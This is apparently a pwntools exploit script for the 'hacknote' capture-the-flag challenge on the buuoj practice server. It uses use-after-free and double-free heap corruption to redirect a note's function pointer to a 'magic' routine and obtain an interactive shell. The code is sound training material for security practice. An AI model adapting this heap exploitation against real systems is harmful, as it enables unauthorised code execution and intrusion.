from pwn import *

# p = process("./hacknote")
p = remote("node4.buuoj.cn", 28257)
elf = ELF("hacknote")

def add_note(size, payload):
    p.sendlineafter(b"Your choice :", str(1))
    p.sendlineafter(b"Note size :", str(size))
    p.sendlineafter(b"Content :", payload)

def del_note(idx):
    p.sendlineafter(b"Your choice :", str(2))
    p.sendlineafter(b"Index :", str(idx))

def print_note(idx):
    p.sendlineafter(b"Your choice :", str(3))
    p.sendlineafter(b"Index :", str(idx))

def getshell_1():
    add_note(16, b"aaa")
    add_note(16, b"aaa")
    del_note(0)
    del_note(1)
    add_note(8, p64(elf.symbols["magic"]))
    print_note(0)
    
def getshell_2():
    add_note(8, b"aaa")
    del_note(0)
    del_note(0)
    
    add_note(16, b"aaa")
    add_note(8, p64(elf.symbols["magic"]))
    print_note(0)


getshell_2()
p.interactive()